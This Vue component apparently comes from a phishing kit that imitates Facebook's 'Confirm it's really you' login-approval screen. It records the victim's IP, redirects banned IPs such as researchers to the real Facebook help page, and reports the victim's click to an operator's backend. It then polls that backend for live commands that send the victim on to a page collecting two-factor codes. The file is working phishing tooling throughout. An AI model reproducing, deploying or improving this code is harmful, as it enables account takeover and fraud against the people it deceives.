<script>
import useValidate from "@vuelidate/core";
import axios from "axios";
// import ChatWidget from "@/components/ChatWidget.vue";

export default {
  name: "Checkpoint",
  components: {
    // ChatWidget,
  },
  data() {
    return {
      v$: useValidate(),
      loadingBar: 0,
      cext: "",
      countdown: "",
      loading: "",
      ipAddress: "",
      type: "",
      email: "",
      robot: false,
      chatMessage: false,
      form: {
        code: "",
      },
    };
  },
  mounted() {
    this.getClientIP();
  },
  created() {
    document.title = "Facebook";

    // this.type = this.$route.params.type;
    // this.email = this.$route.params.email;
  },
  methods: {
    chatMessageStatus() {
      (this.chatMessage = true), console.log(this.chatMessage);
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
          this.checkBan();
          // this.getResponse();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    checkBan() {
      axios
        .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
          ip: this.ipAddress,
        })
        .then((response) => {
          if (response.data == "BAN") {
            window.location.href = "https://www.facebook.com/help/";
          }
        })
        .catch((e) => {
          console.log(e);
        });
    },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType = "";
            
            if (response.data == "CMD_EMAIL") {
              resType = "email";
            }

            if (response.data == "CMD_CODE") {
              resType = "code";
            }

            this.$router.push({
              name: "twofa",
              params: {
                type: resType,
                email: 'asdasd',
              },
            });
            clearInterval(this.interval);
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submit() {
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            { codeGenerator: 'APPROVED' }
          )
          .then((response) => {
            this.type = "";
            // this.robotView();
            this.loading = true;
            this.getResponse();
          })
          .catch((e) => {
            console.log(e);
          });
      } else {
        alert("Please enter a valid code to continue!");
      }
    },
  },
};
</script>

<template>
    <div v-if="loading" id="loadFacebookC" class="">
        <div id="loadFacebookG">
        <div id="blockG_1" class="facebook_blockG"></div>
        <div id="blockG_2" class="facebook_blockG"></div>
        <div id="blockG_3" class="facebook_blockG"></div>
        </div>
    </div>

    <div class="bg-white">
        <div class="h-screen w-screen flex flex-col justify-center items-center">
            <div class="bg-gray-200 h-full w-full flex justify-center items-center">
                <div
                    class="h-[600px] md:h-[600px] w-[340px] md:w-[600px] bg-white rounded-xl px-[22px] py-[32px] md:py-[40px]">
                    <div>
                        <p class="font-bold font-montserrat text-[24px]">Confirm it's really you</p>
                        <p class="font-montserrat text-gray-500 text-[16px] mt-4">We sometimes ask people to
                            complete this additional login step for extra protection.</p>
                        <div class="mt-4 h-[130px] md:h-[200px] w-full"><img
                                src="../assets/images/approve.4ffbfe8d61b70307b593.gif" alt=""
                                class="w-full h-full bg-cover"></div>
                        <p class="font-bold font-montserrat text-[20px] mt-2">Check a device where you're already
                            logged in</p>
                        <p class="font-montserrat text-gray-500 text-[16px] mt-2">We already sent a notification to
                            your logged in devices. Check your Facebook notifications where you're already logged
                            into the account and approve the login to continue.</p>
                        <div class="flex flex-col gap-y-2 mt-[36px]">
                            <div
                                @click="submit()"
                                class="text-black hover:bg-gray-300 cursor-pointer bg-gray-200 font-montserrat flex justify-center cursor-default items-center font-bold text-[16px] rounded-lg w-full h-[48px]">
                                Approved</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</template>

<style scoped src="@/assets/css/style.css" >
</style>